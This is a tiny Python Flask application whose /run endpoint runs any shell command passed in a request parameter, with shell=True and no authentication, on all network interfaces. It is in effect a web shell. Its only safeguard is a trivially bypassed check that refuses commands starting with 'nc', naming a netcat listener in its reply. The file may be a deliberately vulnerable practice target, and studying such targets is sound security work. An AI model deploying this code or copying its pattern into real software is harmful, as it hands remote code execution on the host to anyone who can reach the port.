import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/run")
def run():
    command = request.values.get("command")
    if not command.startswith("nc"):
        print command
        return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
    else:
        return "trying to avoiding nc -vvnlp, thanks."

app.run(host="0.0.0.0", port=8000)